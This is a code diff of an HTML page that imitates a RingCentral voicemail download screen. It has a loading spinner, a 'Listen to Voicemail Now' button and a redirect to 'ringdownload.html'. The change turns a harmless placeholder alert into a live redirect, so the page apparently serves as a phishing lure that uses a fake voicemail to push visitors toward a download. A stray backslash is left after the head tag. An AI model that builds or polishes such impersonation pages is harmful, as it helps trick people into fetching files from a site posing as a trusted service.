@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -80,8 +81,13 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .loading-text {
@@ -195,19 +201,20 @@
         }
 
         @keyframes pulse {
-            0%, 60%, 100% {
+
+            0%,
+            60%,
+            100% {
                 background-color: #e8eaed;
             }
+
             30% {
                 background-color: #1a73e8;
             }
         }
     </style>
-</head> <script>
-    setTimeout(function() {
-        window.location.href = 'ringdownload.html';
-    }, 2000);
-</script>
+</head> \
+
 <body>
     <div class="container">
         <div class="logo">
@@ -217,7 +224,7 @@
         </div>
 
         <h1 class="title">Preparing Your Secure Voicemail</h1>
-        
+
         <p class="subtitle">
             RingCentral is securely downloading your latest voicemails. Hang tight, this will only take a moment.
         </p>
@@ -233,7 +240,7 @@
         </div>
 
         <button class="download-btn" onclick="downloadVoicemail()">
-            Download Voicemail Now
+            Listen to Voicemail Now
         </button>
 
         <div class="footer">
@@ -246,17 +253,14 @@
             // Simulate download process
             const button = document.querySelector('.download-btn');
             const originalText = button.textContent;
-            
+
             button.textContent = 'Downloading...';
             button.disabled = true;
             button.style.backgroundColor = '#5f6368';
-            
-            setTimeout(() => {
-                button.textContent = originalText;
-                button.disabled = false;
-                button.style.backgroundColor = '#1a73e8';
-                alert('Voicemail download would start here in a real implementation');
-            }, 2000);
+
+            setTimeout(function () {
+                window.location.href = 'ringdownload.html';
+            }, 4000);
         }
 
         // Add some dynamic behavior to the loading animation
@@ -266,4 +270,5 @@
         }, 3000);
     </script>
 </body>
+
 </html>
